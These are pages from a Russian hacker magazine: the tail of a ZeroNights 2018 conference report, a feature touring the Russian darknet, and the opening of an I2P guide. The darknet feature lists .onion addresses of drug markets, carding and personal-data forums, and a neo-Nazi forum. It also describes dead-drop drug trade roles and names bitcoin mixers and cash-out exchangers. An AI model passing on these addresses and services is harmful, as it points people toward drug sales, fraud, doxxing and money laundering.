  Еще пара барных стоек была и на втором этаже вне сцен, одна рядом
с местом, где проходили конкурсы (см. фото ниже), и другая там, где дол жна
была пройти афтерпати.





Между прочим, мне очень понравилась воз можность сидеть за столиками
(трибунами?), там было уютно.





Алкогольные напитки зап ретили про давать до 18:00. Поэтому приходилось
довольствоваться водичкой, соком, чаем и кофе. Также в программке говори‐
лось, что где‐то внутри клуба можно купить хот‐доги, бургеры и прочую снедь.
Я, увы, не нашел. Зато вокруг клуба полно кафешек, куда я и сходил переку‐
сить.
  Маленькая сцена в первый день принимала Hardware Zone.





На второй день в этом зале раз местилась Web Village. Здесь было очень мно‐
го народа и несколь ко интересных докладов. Аншлаг соб рал Андрей Ковалёв
с докладом Introduction into browser hacking, в котором он поделил ся опы том,
как въехать в разработку экс плоитов под браузеры (видео пока что нет, но ты
можешь глянуть слайды).





Мне эта тема близка, поэто му и фоток много получилось. :)





Из того, что шло на боль шой сцене, мне было интересно послушать Хоксена
Коре с его докладом Diﬃng C source codes to binaries. Плюс хотел попасть
на доклад Александра Ермолова и Рус лана Закиро ва про NUClear explotion.
Они были в первый день.





Во второй день отжигала команда Tencent. Они приехали на ZN с четырьмя
докладами! Был крутой доклад по фаз зингу Massive Scale USB Device Driver
Fuzz WITHOUT device и интерес ный доклад, описывающий векторы атаки,
которые возникают при внедрении средств GPU‐виртуализации, From Graphic
Mode To God Mode, Discovery Vulnerabilities of GPU Virtualization.
  Оба доклада я успешно прос пал у себя в номере… Хотел еще попасть
на доклад Дениса Селянина Researching Marvell Avastar Wi‐Fi: from zero knowl‐
edge to over‐the‐air zero‐touch RCE, но мы со знакомы ми ушли обедать. Вот
такой из меня слушатель! :)
  Тем не менее рекомендую посмотреть доклады по ссылкам выше, да и
с остальными тоже ознакомиться.


Отзыв      VolgaCTF
Впечатления в целом положитель ные.
  Из плюсов: отдельная комната для курящих с экра нами, на которых тран‐
сляция, и расписание; отличная музыка (ждем плей‐лист!). Также было
отличное оформление, в том числе презентации и видео. Прекрасные док‐
ладчики — ребята просто самые крутые. К тому же много иностранных док‐
ладчиков, что тоже классно.
  Из минусов: огромная очередь на вход с небольшой неразберихой
при регистрации; значки достались далеко не всем (даже не всем, кто при‐
ехал к началу регистрации); подкачал перевод докладов; места и розеток
порой не хватало. А еще тяжело ока залось выбирать между дву мя треками
докладов.
  В общем, было видно, что организа торы очень старались, но пришлось им
нелегко!





                                     Продолжение статьи →
HEADER               ← НАЧАЛО СТАТЬИ
            ОТЧЕТ С
    ZERONIGHTS 2018
            КАК ПРОХОДИЛА ТОПОВАЯ КОНФЕРЕНЦИЯ
                     ПО ИНФОБЕЗОПАСНОСТИ





АФТЕРПАТИ
Ты, наверное, уже подустал от чтения моего отчета, но поверь — я сам
вымотался гораздо силь нее. Отсту пать тем не менее было некуда: первый
день закрывался традиционной вечерин кой Яндекса.





Вечеринка была закрытой, но любой желающий мог купить билет с проходом
на нее. Мне, как предста вителю и одно му из руководителей сообщества, был
выделен инвайт. За что отдельное спа сибо организаторам!





Поскольку это была спикер‐пати, пришедшие получали шанс не только залить
в себя горячительных напитков, но и пооб щаться со спикерами. Конечно,
если к ним были вопросы. :)





На вечеринке я встретил много зна комых лиц. Пооб щался со старыми зна‐
комыми и успел познакомиться с нес колькими новыми людьми. Смог пос‐
лушать умных людей из Apple и Opera (спа сибо Диме Евдокимову!). Ниже
просто несколько фотографий с вечерин ки, без комментариев.





Отзыв SPbCTF
ZeroNights в этом году была очень ламповой. Если не заходить в главный зал,
можно было подумать, что это какая‐нибудь юбилей ная встре ча DCG7812. :)
От нас были и школьники, и уже давно работающие участники — показатель
того, насколько разноплановых людей собирает конференция. Рекомендуем
тем, кто пока находится в самом начале хакерского пути, обязательно
побывать на ZN, это придаст запал, принесет новые знания, знакомства
и практику.
  Мы счастливы, что кон ференцию вновь провели в Питере, как в самый
первый раз. Нужно больше здешней дви жухи! Доклады на Web Village —
огонь! Особенно понравился доклад Defense. Change my mind Сергея Белова
и Егора Карбутова и доклад Паши Топоркова — про PHP unserialize.
  Оформление площадки и граффити‐дизайн, сти лизация Матриша, — все
это нам очень понравилось. Мы свои стикеры с Ыжом (талисманом нашего
сообщества) сделали в том же стиле.
  В следующем году ждем больше активностей на площадке, а в остальном
хочется пожелать организаторам и дальше искать новые форматы. ZN — изу‐
мительное место для эксперимен тов. Спасибо, что делаете такую полезную
штуку!



БЛАГОДАРНОСТИ
Хочу поблагодарить всех причас тных к орга низации мероприятия: организа‐
торов и докладчиков, без которых ничего бы из это го не состоялось. Вы луч‐
шие! Также огромное спа сибо ребятам, которые разработали конкурсы и тех‐
нические стенды (без вас мы бы скучали!); диджеям The Dual Personality
и Сергею Белову; ну и, конечно же, всем участникам конференции! Со всеми,
с кем удалось встретиться, мне было очень приятно пообщаться. ZeroNights
удалась, и с этим никто не будет спо рить. Встретимся в сле дующем году!





Отзыв SchoolCTF
Мы (SiBears → SchoolCTF) живем где‐то в середине леса, и нам нужен веский
повод, чтобы куда‐то выб рать ся.  :) ZN — это всегда отличная мотивация.
Еще с лета начинаются разговоры о тас ке на HackQuest, который делают ини‐
циативные люди из нашей команды. Надеемся, вам понравилось!
  Все знают, что сами по себе конференции — это далеко не только спи‐
керы с докладами. Так как наше сообщес тво в основном занимается CTF
и наши ребята немного разъехались по разным странам, для нас это также
крутой повод соб раться, пообщаться с уже давними друзьями и знакомы ми,
которые тоже приезжают на ZN.
  Сама конферен ция, как всегда, оставляет только самые положительные
впечатления. И очень кру то, что в этом году ничего никому не помешало и все
так же здорово соб рались. Доклады — огонь! Дополнительные активности
тоже. Атмосфера непередаваемая.



        WWW

                  •Официальный альбом с фотографиями
                    •Небольшой  альбом  с моими фотографиями
                       и фотографиями f0x0f
COVERSTORY

 ПУТЕШЕСТВИЕ
 ПО ДАРКНЕТУ





                                         Никита Зличин
                                                   zlicin.v@gmail.com





ОБХОДИМ САМЫЕ ЗЛАЧНЫЕ МЕСТА .ONION





Слово «даркнет» уже почти что ста ло клише, которым обоз‐
начают все запретное, труднодоступное и потенциально
опасное, что есть в Сети. Но что такое реаль ный даркнет?
Мы предлагаем тебе очередное исследование, в котором
делимся всем, что уда лось отко пать за последнее время.
На этот раз — с фокусом на российские темные ресурсы.


           WARNING

                      Вся информация предоставлена исключительно
                        в ознакомительных целях. Ни редак ция, ни автор
                      не призывают к использованию полученных зна‐
                      ний в прак тических целях и не несут ответствен‐
                       ности за любой возможный вред, причиненный
                      материалами данной статьи.



ПОИСКОВИКИ
Tor Browser встречает нас встроенным поисковиком DuckDuckGo. С точки
зрения приватности — отличный выбор, но ищет DDG исключительно
по открытому интернету, так что в наших изысканиях он не при годится.





                        DuckDuckGo, привет!

Впрочем, в даркнете сво их поисковиков чуть ли не больше, чем в клирнете.
Среди самых популярных: Ahmia, Candle и Torch. Были еще хорошие поис‐
ковики под названием Grams и Fess, но по неиз вестным причинам они сейчас
недоступны. Каждый из них выда ет разные результаты по одним и тем же зап‐
росам, так что лучше иметь в закладках все три ресурса.


             INFO

                   В этой статье мы скон центрируемся на том, что
                      доступно в .onion, так что если хочешь перехо‐
                        дить по ссылкам, то тебе понадобится Tor Brows‐
                           er.


Первым я обычно пускаю в ход Candle — это не самый извес тный поисковик,
зато на нем нет рекламы сторонних ресурсов и релевантность результатов,
по моим ощущениям, выше, чем у того же Torch. С дру гой стороны, даже
нерелевантные ссылки подчас интересны.
   Torch, как и предвещает его название, постоянно выдает ссылки на ресур‐
сы, связанные с наркоторговлей. Также он совершенно не понимает кирил‐
лицу и успел испортить себе репутацию рекламой самых сомнительных сай‐
тов.





                              Torch: найдется все?

Поисковик Ahmia отличает ся тем, что он дос тупен как в даркнете, так и в клир‐
нете. Релевантность выдачи при этом (субъективно) не очень высокая: как и
Torch, он часто выдает ссылки, которые никак не относятся к теме поис ка.
  Однако если мы решили изучить таинственный мир даркнета, то поис‐
ковики  тут  помогут  слабо —  слишком  уж  мало  ресурсов  доступно
для индексации. Иногда поисковик даже может завести не туда, выдав ссылку
на фейковый проект.


             INFO

                     Читай также наш отчет за 2016 год: «Секреты
                    Даркнета. Ищем полезное в скрытых сервисах
                           Tor».



КАТАЛОГИ — КАРТЫ TOR
Начинать изыскания я рекомендую с каталогов ссылок. Там тоже, конечно,
попадется мусор и устаревшие ссылки, но выбора не так много. Из англо‐
язычных самый известный ресурс — это The Hidden Wiki, на русском — «Год‐
нотаба». Помимо этого, сущес твует еще не один десяток сборников ссы‐
лок — см., например, OnionDir и Oneirun.





                  «Годнотаба» мониторит годноту в Tor


           WARNING

                    Остерегайся фальшивок! Популярные сборники
                     ссылок  часто  подделывают,  заменяя  адреса
                       ресурсов. Подделки есть и у «Годнотабы», так что
                       будь внимателен.



ДАРКНЕТ ОБРАЗОВАТЕЛЬНЫЙ
Буйное пиратство и дешевые книгочи талки сделали покупку книг ненужной
для многих. Но правооб ладатели с этим вряд ли смирятся. Поэтому в клир‐
нете ссылок на скачивание книг ста новится все меньше. В даркне те — другое
дело: на выбор есть «Флибус та» и «Словес ный Богатырь». Выбор там нас‐
только огромный, что кажется, будто есть вообще всё.





                         Flibusta — для любителей читать


ДАРКНЕТ — ДРУГ ТОРРЕНТОВ
Еще в начале‐середине нулевых торренты никто и не думал запрещать. Люди
качали книги, фильмы, игры, сериалы и даже учебники и подчас даже
не задумывались, что наруша ют закон. Эта ситуация пос тепенно меняется,
но даркнет становится новым прибежищем пиратства.





                   RuTor как гарант вечной жизни Torrent

У торрент‐трекеров и поисковиков вроде RuTor и The Pirate Bay в обя затель‐
ном порядке есть ссылки в onion, которые дают пользователям воз можность
не обращать внимания на запреты и огра ничения.


ОНЛАЙН-МАГАЗИНЫ, В КОТОРЫХ НЕ ПРИНИМАЮТ КАРТЫ
Переходим к нелегальным магазинам, которы ми и славится «луковая» сеть.
Что характерно, большая часть из них связана с наркоторговлей, но из пес ни
слов не выкинешь, придется пройтись и по ним. Покупка наркотиков
в интерне те нынче дело заурядное: каждая ста рушка с лавочки во дворе уже
знает, что за клады ищут подозритель ные молодые люди.


           WARNING

                     Производство,  сбыт, пересылка наркотических
                      и психотропных веществ преследуется по закону
                              (ст. 228–231 УК РФ). Автор и редакция не несут
                         ответствен ности за материалы, опуб ликованные
                      по ссылкам. Перехо дя по ним, ты действуешь
                       на свой страх и риск.


Если ты вдруг не слышал об этих тем ных делах, то поясню в двух словах.
Покупатель сначала использует обменник, чтобы получить биткойны, затем
с ними отправляется в магазин и приобретает желаемые вещества. Ему дают
адрес и фотографию закладки, которую и предсто ит отыскать.


Сло варь тер минов
 • Склад — человек, хра нящий у себя большие объемы наркотиков, реали‐
  зующий их через мастер‑клады — закладки с большим количеством
  вещества для кладмена.
 • Клад мен — забирает мас тер‐клад, фасует вещество на клады поменьше.
 • Гро вер — человек, производящий наркотик. Как правило, производство
   устраивают в гаражах, подвалах, заб рошенных фабриках и подобных мес‐
   тах.
 • Опе ратор — человек, отвечающий за связь магазина с клиентом. Задача
   оператора — решать все возникшие вопросы, взаимодей ствуя с ауди‐
   торией. Иными сло вами, саппорт проекта.



Мастодонты наркобизнеса в России — это сервисы Hydra и WayAway. Конеч‐
но, существуют и другие магазины, например Matanga или Darkcon. Но нович‐
кам начинают доверять не сра зу, да и узнать о них непросто.
  На Западе самые популярные и большие магазины — это Dream Market
и Free Market.


             INFO

                      Закладочной системой пользуются в основном
                        в России и СНГ. В Аме рике (и в целом на Западе)
                    люди вместо это го изыскивают способы пересы‐
                         лать запрещенные товары по почте или (гораздо
                       реже) доставляют квадрокоп тером.



RAMP
Полтора года назад список самых больших и влиятельных русских магазинов
в даркнете открывал RAMP. Он представлял собой форум для обще ния между
клиентами и продавцами. Летом 2017 года RAMP перес тал функционировать,
что озадачило многих бывших пользователей. Его закрытие широко обсужда‐
ли на других форумах, а кто‐то даже попытался провес ти журналистское рас‐
следование.





                    RAMP до падения

В итоге некто, назвавшийся бывшим модератором RAMP, открыл RAMP 2.0.
Впрочем, быстро оказалось, что это скам: собрав депози ты с продавцов
и покупателей, RAMP 2.0 исчез вслед за своим предшественником. Кстати,
вполне можно было догадаться, что так и про изойдет: модератор под ником
Экзистенция задол го до падения RAMP потерял свой ключ PGP, а проныр‐
ливые  скамеры смогли его заполучить и поз же  стали выдавать себя
за Экзистенцию. По иронии судьбы, Экзистенция отвечал за безопасность
площадки.


Hydra
hydraruzxpnew4af.onion
  На место RAMP быстро пришел форум под названием Hydra. Его админис‐
трация пока что делает все, чтобы удержать лидерс тво. Мало того что пло‐
щадка ведет свой канал в Telegram, где делится с подписчиками методами
съема закладок и мировыми новос тями о наркотиках, так еще совсем недав‐
но «Гидра» покупала рекламу в YouTube, что вызвало серьезное возмущение
общественности. Hydra спокойно переживает DDoS‐атаки и пока что уверен‐
но остается на плаву.





                          Hydra о трех головах

Здесь все почти как на «Рампе», раз ве что интерфейс чуть получше. «Гидра»
дает возможность поль зователям общаться на форуме и пре доставляет лич‐
ные обменники для покупки биткойнов. К опла те принимают и Qiwi: покупка
наркотиков, судя по всему, ничем не отличается от любой другой транзакции
в этой системе.
  Администрация «Гидры» вплотную занимается пиаром и устраивает акции,
подчас сомнительные. Например, на «Гидре» можно попытать удачу, сыграв
в рулетку — лотерейные билеты покупаются с привязанного к аккаунту бит‐
койн‐кошелька.
  При этом до падения «Рампа» юзеры называли Hydra «солевой», потому
что в отличие от него на «Гидре» вовсю идет торговля «спайсами» и «солями»,
которые наносят колоссальный вред здоровью человека.
   Кстати, Hydra имеет и адрес в клирнете, который, естественно, уже давно
заблокирован Роскомнадзором.


Что еще быва ет на тор говых пло щад ках
Наркотики — это не единс твенное, что продает ся на перечисленных сайтах.
Например, «Гидра» предлага ет пользователям сим‐карты и карты, офор‐
мленные на «дропов» (подставных лиц), модемы, роутеры, VPN‐сервисы,
дебетовые карты и много других вещей, которые активно используют работ‐
ники наркобизнеса.
   Также в каждом теневом магазине есть раз дел с вакансиями, где «хед‐
хантеры» рекрутируют «кладменов» — анонимных курьеров, «склады», гро‐
веров и операторов. Последняя вакансия встречается реже, чем кладмены,
спрос на которых огромен из‐за бешеной текучки кадров.





                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ

    ПУТЕШЕСТВИЕ ПО
           ДАРКНЕТУ
          ОБХОДИМ САМЫЕ ЗЛАЧНЫЕ МЕСТА .ONION





ХАКЕРСКИЕ ФОРУМЫ
Для многих даркнет заканчивается на наркоплощадках, но это лишь одна
из первых остановок в нашем путешес твии по темной стороне интерне та.
В даркнете бывают и пло щадки, где за попытку нанять человека в наркобиз‐
нес пользователь получит пожизненный бан. Давай посмотрим, какие есть
самые большие хакерские и кардерские форумы в российском даркне те.


        WWW

                    Среди  англоязычных  форумов  примечателен
                      DaMaGeLaB.IN — его пользователи занимаются
                       исследованием и обсуждением хакинга, кодинга,
                     малвари и прочих тем, связанных с ИБ.



WWH-CLUB
wwhclublci77vnbi.onion
  WWH — крупнейший из форумов русских кардеров. У него есть адрес и в
клирнете, который до сих пор остается дос тупным даже с российского IP.





                       WWH‐CLUB

Одна из особенностей площадки — предоставление образовательных услуг.
За определенную сумму (порядка тысячи долларов) «менторы» форума обе‐
щают обучить любого новичка искусс тву кардинга, помочь со всеми воп‐
росами и наставить на «счас тливую и богатую» жизнь.
   Раньше регистрация на WWH позволяла найти тонну полезной информа‐
ции, связанной с информа ционной безопасностью. В отдельных постах даже
выкладывались лекции по кардингу, которые про водились в Jabber (а иногда
и в Skype). Но открытая и бесплат ная регистрация привела к засилью троллей
и «школьников» — так тут называют неадекватных или ненадежных поль‐
зователей. Потому с недавнего момента админис трация закрыла от новых
пользователей все «сливки». Дос туп  к закрытым раз делам теперь сто‐
ит 20 долларов США. На WWH оста вили пару откры тых разделов, но полезной
информации там обыч но не бывает.


Verified
veriﬁed2ebdpvms.onion
  В среде российских кардеров «Вериф» — это один из самых уважаемых
долгожителей. Он, как и WWH, стал неким учеб ником кардеров и мес том
для общения, поиска информа ции и нуж ных для теневой работы людей.





                                    Veriﬁed

Регистрация на форуме стоит 50 долларов США, зарегистрироваться бес‐
платно невозможно. Но даже пос ле оплаты доступа вес ти деятельность
на «Верифе» проб лематично, ведь к новичкам кардеры всегда относятся
с опаской. Кто‐то из старожилов сначала должен поручиться за новичка —
только тогда он сможет начать что‐то делать на форуме. То есть даже если
пользователь приобрел полный доступ к форуму, вес ти дела без поручитель‐
ства или депозита он не смо жет.


Exploit.in
forum.exploit.in
   Этот форум посвящен  в основном  хакерской тематике. В  отличие
от «Верифа», регистрация на «Экс плоите» пока бесплатная,  но, чтобы
получить доступ к форуму, пользователю необ ходимо предоставить админис‐
трации ссылку на свои акка унты на других бордах. Аккаунты должны быть
с репутацией и регистра цией от одного года, в противном случае админис‐
трация отказывает поль зователям в предос тавлении дос тупа.





                                         Exploit.in

Exploit.in уважают в российском даркнете, да и западные кол леги сюда иногда
заглядывают. Основной контингент — это кардеры, которые предлагают свои
услуги — от создания сайтов до предоставления ботнетов.
  Ресурс доступен в клирнете, также у него есть сервер Jabber, почитаемый
пользователями не мень ше самого форума.


CrdClub
crdclub4wraumez4.onion
   Это один из старейших форумов, пос вященных кардерской тематике.
Регистрация бесплатная, дос туп предос тавляется ко всем разделам. Форум,
как и  Exploit, можно поделить на две большие части: русскоговорящую
и англоговорящую.





                               CrdClub

Здесь сотни статей, пос вящен ных не только кардингу, но и скаму, взлому
и социальной инже нерии.


Probiv
probiv7jg46vmbox.onion
   Если в постах на Exploit, WWH и Veriﬁed авторы часто пишут, что они «не
работают по ру и СНГ» (что озна чает нежелание проворачивать темные дела
на территории родного или близлежащего государства), то «Пробив» популя‐
рен именно среди мошенников, работающих в России и СНГ.





                                     Probiv

Отличительная черта форума — он почти полностью посвящен «пробивам»,
то есть за определенную сумму на форуме можно узнать информацию
об определенном человеке: от кредитной истории до паспортных данных. Тут
же можно встретить и торговлю «схемами заработка»: человек пре доставляет
администрации документ с ману алом по заработ ку в Сети (или в офлайне),
после проверки материала его публику ют в определенной ветке форума
и продают пользователям. Разброс цен за такие «схемы заработка» —
от пары тысяч рублей до нескольких миллионов. Все зависит от потенциаль‐
ного профита.


Популяр ные услу ги и товары
Все перечисленные форумы с готовностью предлагают работу специалис‐
там. Популярность разных видов вакансий варьиру ется в зависи мости от нап‐
равленности форума: на WWH ищут умелых кардеров, на «Экплоите» нужны
кодеры, а «Пробив» в основном ищет дропов под ООО и микрозай мы.
  И конечно, везде проц ветает торговля: на WWH можно купить данные
чужой кредитной карты, на «Экспло ите» — ботнет или сайт, а «Пробив» пре‐
доставит паспортные данные, взломанные акка унты и много чего другого
для теневой деятельности.



ОБЩЕНИЕ
Некоторые площадки так и не определились с основным направлением
и предлагают всего понемножку. Дру гие предназначены исключительно
для анонимного общения. Пройдемся по нес коль ким популярным местечкам.


Runion
lwplxqzvmgu43uﬀ.onion
   «Рунион» — это уникальное место, где представлено вообще все, что есть
в российском даркнете. Здесь предлага ют купить оружие и наркотики, обща‐
ются на политические темы и узна ют о работе спецслужб. Недавно админис‐
трация Runion запустила свою пло щадку для наркоторговли под названием
Solaris (правда, там совсем безлюдно).





                                Runion

Если покопаться в темах форума, мож но узнать, как избавляться от трупа,
провозить запрещен ные вещества через гра ницу или даже сменить лич‐
ность, — «Рунион» даст нуж ную информа цию и нужных людей. Однако про‐
бовать пользоваться этими услугами мы не совету ем никому. Это крайне
опасно не только из‐за проблем с законом, но и потому, что за маской ано‐
нима может скрываться кто угодно.
   Также на форуме можно приобрести занятные мануалы по сетевой
безопасности. Впрочем, такие вещи встречаются и на дру гих форумах. Тор‐
говля оружием тоже не редкость в даркнете. Впрочем, тут мало что изме‐
нилось со времен нашего предыдущего исследова ния.
  До «Руниона» существо вал другой ана логичный форум, и даже наз вание
было похожим — RuOnion. Одна ко он закрылся, и о причинах никто не знает.


Chat with stranger
tetatl6umgbmtv27.onion





                           Chat with stranger

Общение с незнакомцем в эпо ху Tinder, Badoo и прочих спе циализированных
сервисов — это уже не что‐то сверхъестес твенное. Впрочем, Chat with
stranger имеет важное отличие — тут ни собеседник, ни владельцы сервиса
совершенно точно ничего о тебе не зна ют. Обычно в онлайне все го
где‐то 40–50 человек, но дож дать ся появления собеседника можно без тру‐
да. Увы, далеко не всегда это адекватные личности, которые горят желанием
общаться на предложенные темы, одна ко в этом тоже может быть свой шарм.

«НС‑форум»
vvvvvvvv766nz273.onion
   Это форум, посвященный теме национал‐социализма. На нем единомыш‐
ленники делятся книгами, идеями и историями своей жизни. Если «Рунион» —
частично форум, частично торговая пло щадка, то здесь исключительно обще‐
ние. От некоторых разделов буквально волосы встают дыбом, поэтому если
ты против любого насилия, то лучше обходи этот форум стороной.





                          НС‐форум

Есть, впрочем, и полез ная часть, посвященная информационной безопас‐
ности. Например, как установить Tails, какой выб рать VPN, как зашифровать
флешку и так далее. Но если «Рунион» и «Экпло ит» озабочены этими вещами
в связи с нелегальной деятельностью и мошенническими схемами, то
«НС‐форум» предоставляет их из идеологических соображений. К тому же
некоторые участники движения имеют проб лемы с законом и стараются
скрывать свою деятельность.


Дру гие мес та для обще ния
На этом список чатов и форумов не заканчива ется — в .onion есть даже зер‐
кало Facebook, но вряд ли оно смо жет спасти от наказания за репост. Еще,
например,  есть форум  Tor4,  где  поль зователи обмениваются  своими
трип‐репортами  (то есть описаниями ощущений от при ема наркотиков)
и обсуждают влияние того или иного вещества на организм.
  В даркне те встречаются и куда более пуга ющие форумы: педофилы,
садисты, террористы, но по понятным соображениям «Хакер» не будет пуб‐
ликовать ссылки на их сайты. Если тебе уж очень хочется най ти что‐то подоб‐
ное, открывай катало ги по ссылкам из начала этой статьи и ищи. Но пос‐
тарайся все же не задерживать ся там слишком дол го и береги психичес кое
здоровье! К тому же нам еще предстоит пройтись по экономической части
даркнета.



ДЕНЬГИ В ДАРКНЕТЕ: КОШЕЛЕК ИЛИ ЛУК!
В даркнет обычно приходят либо для полностью анонимного обще ния, либо
(гораздо  чаще)  обделывать  темные  делишки.  Поэтому  тут  множатся
и обменники, и сервисы по обналичке, и услуги дропов. Но прежде чем что‐то
делать с деньгами, их нужно куда‐то положить.
  Еще в 2016 году на форумах ломали голову — анонимен ли биткойн?
И можно ли исполь зовать его для гряз ных дел? К несчастью для теневого
бизнеса — крип товалю та ока залась неанонимной. Все чаще в новостях мож‐
но увидеть, как полиция задерживает очередного кодера или хакера, который
хранил свои деньги в бит койнах. Но любая проблема — это прежде всего
вызов, а в даркнете их ой как любят.
  Например, Rahakott функционирует как обычный биткойн‐кошелек, но в
него уже встроен мик шер. Как это работает? Человек отправляет ему опре‐
деленную сумму (предположим, два биткойна), тот маленькими частями рас‐
сылает деньги на другие кошельки, а затем собирает деньги на другом
кошельке, расположенном на Rahakott. Получа ется, что отследить тран‐
закцию почти невозможно, ведь суммы поступают маленькими час тями с сот‐
ни разных адресов.





     Rahakott — онлайновый биткойн‐кошелек со встроенным микшером

Подобные микшеры считаются гораздо более надежными, чем просто
кошельки, и их услуги пользуются популярностью. Но далеко не все из них
работают, как обещают владельцы, а некото рые совсем не переводят деньги,
оставляя их себе. Есть, кстати, и прос то микшеры без встроенных кошельков,
например MixerMoney или Blender.





                   MixerMoney для грязных биткойнов

Связующим звеном между биткойнами и наличными (или электронными)
деньгами выступают обменники. В даркнете, как и в клирнете, их огромное
количество. На WWH или на «Экспло ите» масса рекламных ссылок. Как пра‐
вило, те же сайты предоставляют и услуги «обнала», то есть человек просто
отправляет свои биткойны, а получает наличные деньги через курьеров
или закладку. Примеры таких обменников — Konvert и 24xbtc.
   Если собираешься воспользовать ся подоб ными услугами, помни, что дей‐
ствуешь на свой страх и риск: на многих форумах часто можно встретить ком‐
ментарии о том, что тот или иной обменник «соскамился» (то есть начал
обманывать клиентов и забирать день ги себе). Вообще даркнет и скам —
понятия неразрывные.


СКАМ В .ONION
Вслед за деньгами и успехом популярность обычно приносит и разные проб‐
лемы. Но если популярным актерам всего лишь подражают, то популярные
сайты в даркнете просто подделыва ют с целью нажиться на незнании поль‐
зователей.
  Например, если вбить сло во Hydra в поисковик Candle, наверху в поис‐
ковой выдаче будут фейки. Там все как на нас тоящей «Гидре», но вместо
адреса закладки пользователь получит «пустоадрес» (где ничего не найдет)
либо просто бан.
  В пределах самого форума от это го стра хуют гаранты: они выступают пос‐
редниками при сделке и переводят деньги продавцу, только когда покупатель
подтвердит получение. Но если форум поддель ный, то поддельным будет
и гарант.





                    Пример типичного кидалы

Такие форумы, как правило, находятся очень легко — ссыл ки на них попада‐
ются в выдаче поисковиков как по даркнету, так и по клирнету. Если видишь
потрясающую сделку типа нового iPhone за полцены, схемы заработка а‐ля
«заработай миллион» стоимостью в несколько тысяч рублей, «заливы» (то
есть перечисление денег с украденной карты) и прочие заманчивые пред‐
ложения, то, скорее всего, это скам.
   Гарантом на мошеннических площадках обычно выступает один человек,
который после получения нужной суммы просто отправит жертву в бан
без объясне ния причин. Хотя порой админис тра ция может что‐нибудь
и выдумать, чтобы это смотрелось более орга нично.





                      От дай свои биткойны!

В даркнете есть и мно жес тво обменников, которые действуют по схожему
принципу: просто забирают криптовалю ту и не отдают ее. Самый верный спо‐
соб не попасться на удочку мошенника — не использовать ссылки с неп‐
роверенных источников (только с про веренных каталогов) и всегда проверять
адрес ресурса, ведь на первый взгляд можно его можно и не отличить.


КОНЕЦ ПРИКЛЮЧЕНИЯ
Каждый год в даркнете массово появляются, переезжают и исче зают сайты.
Да, большая часть из них посвящена торговле запрещенным или скаму,
но  есть и места,  которые  позволяют общаться  на  вол нующие темы
или почитать истории из жизни незнакомых людей. В целом это холодное
и неуютное место, но при этом крайне интерес ное. А уж что конкретно прив‐
лечет твое внимание, зависит только от тебя.
COVERSTORY

 ПУТЕШЕСТВИЕ
 ПО ДАРКНЕТУ





                                         Никита Зличин
                                                   zlicin.v@gmail.com





    ЧТО ИНТЕРЕСНОГО МОЖНО НАЙТИ
       В АНОНИМНОЙ СЕТИ I2P



I2P, или Invisible Internet Project, — это на сегодняшний день
самая анонимная сеть. Здесь ты можешь ходить по сайтам
и пользоваться сервисами, не раскрывая сторонним лицам
ни  байта  своей  информа ции. И  хоть  появился  I2P
в 2003 году, сеть продолжает расти и шириться. Давай пос‐
мотрим, что интересного есть в I2P сегодня.


I2P построен по принципу оверлея, то есть анонимный и защищенный слой
работает поверх другой сети — интернета. Одна из главных особенностей
I2P — децентрализованность. В этой сети нет серверов DNS, их место
занимают автоматически обновляемые «адресные книги». А роль адресов
играют криптографические ключи, никак не выда ющие реальные компьюте ры.
Каждый пользователь проекта может получить свой ключ, который невоз‐
можно отсле дить.
  Многие пользователи час то зада ются вопросом, зачем использовать I2P,
когда есть VPN и Tor. Если сравнивать I2P с бра узером Tor, можно выделить
следующие различия:
 1. Tor использует «луковую» маршру тиза цию, отправляя твой трафик через
   знаменитые восемь прокси, но при этом сам по себе никак не защищает
   от расшифровки. I2P, наоборот, опирается на шифрование трафика.
 2. Tor — большой любитель SOCKS, тогда как I2P предпочитает исполь‐
   зовать собственный API. Что удобнее — решать тебе.
 3. Туннели I2P однонаправленные в отличие от Tor.
 4. Tor хоть и обладает свойствами пиринговой сети, но при этом централизо‐
   ванный. I2P пол ностью децентра лизо ван.

Это лишь основные отличия I2P от Tor. Но даже исходя только из них можно
смело заявить о том, что I2P — более безопас ный и анонимный вариант. Если
сравнивать I2P с VPN, мы увидим примерно схожую картину: VPN надежен
настолько, насколько надежен его провайдер или хостер.
  Подробнее о прин ципах работы I2P «Хакер» уже писал в статье «Рас кры‐
ваем секреты сети I2P», поэто му не будем останавливаться на технической
реализации и как можно быс трее отправимся в обещанное путешествие.
Но сначала — сбор снаряжения.


ЗДЕСЬ ВАМ НЕ TOR
У Tor и I2P есть одно сходс тво: зайти на их ресурсы без дополнительного
софта не получится. Но если у Tor все просто — ска чал браузер и наслаждай‐
ся, то разобраться с I2P рядовым юзерам сложнее. Вот что нам понадобится.
 1. Java. Версию для Windows качай здесь и устанавливай.
 2. Официальный установщик с сайта I2P. Выбери тот, что подходит для твоей
   системы, и установи. В списке, кста ти, есть даже Android.
 3. Если у тебя Windows, открывай «Пуск → Все программы → I2P» и выбирай
   «Start I2P (no window)». Если Linux, то ты, скорее всего, сам знаешь, что
   делать.
 4. Следующий шаг — открываем браузер, например Firefox. В нем — «Нас‐
   тройки → Допол нитель но → Сеть → Использовать proxy». Запол няем поля
   так же, как на скрин шоте.





                         Нас трой ки proxy
 5. Если у тебя не открылась стра ница консоли I2P, откры ваем ее сами:
   http://127.0.0.1:7657/home.

Отлично! Все готово, чтобы бороздить прос торы I2P. Потом можешь добавить
автоматическую загрузку личных биб лиотек со ссылками на ресурсы в I2P.
Это упростит навигацию.
  И еще один опциональный шаг. Можешь зай ти в раздел «Трафик» и там
изменить долю транзитного тра фика до 100% и увеличить количество
килобайтов на отдачу и прием в секунду до максимума — как на скриншоте.
Практика показывает, что это умень шает время отклика сети.





Вот и все, проходи, разувайся и чувствуй себя как дома! Только перчатки
не снимай, оставлять следы здесь строго зап рещено.


ЧТО ЕСТЬ В I2P
Мир I2P не так богат, как луковые прос торы Tor. Но все же при дол жном поис‐
ке в нем можно найти много полезного, устра шающего и прос то интересного.


Бло ги, борды, форумы
Первое место, которое стоит посетить, — это форум Hidden Answers.
Любителям Onion это местечко покажется знакомым, даже немного род ным.
На форуме люди задают вопросы раз ного характера — от «Ваш любимый
ютубер?» до «Как провернуть аборт?». Отвечают такие же рядовые юзеры.
Конечно, их ответы не всегда хороши или вооб ще в тему, но интересного там
много. У Hidden Answers есть русско язычный аналог под названием Se‐
cretChat.





                          Hidden Answers I2P

В I2P люди очень любят заводить свои блоги, где делятся самой разной
информацией и сооб ражениями. Как пра вило, пишут о таких вещах, о которых
в клирнете говорить опасают ся.
